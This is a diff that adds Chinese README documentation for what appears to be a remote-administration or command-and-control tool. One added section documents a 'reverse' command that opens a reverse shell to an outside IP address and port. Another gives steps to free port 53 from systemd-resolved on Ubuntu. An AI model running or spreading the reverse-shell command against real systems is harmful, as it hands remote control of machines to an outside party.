@@ -98,3 +98,29 @@ list
 获取远端程序当前目录  
 ## hostip  
 获取远端机器的出口ip和主机名
+## reverse
+反弹shell
+```
+reverse 112.55.4.22 56789
+```
+# systemd-resolve占用53端口的解决方法
+以ubuntu为例，编辑
+```
+/etc/systemd/resolved.conf
+```
+按下面修改
+```
+[Resolve]
+DNS=8.8.8.8  #取消注释，增加dns
+#FallbackDNS=
+#Domains=
+#LLMNR=no
+#MulticastDNS=no
+#DNSSEC=no
+#Cache=yes
+DNSStubListener=no  #取消注释，把yes改为no
+```
+重启服务
+```
+systemctl restart systemd-resolved
+```
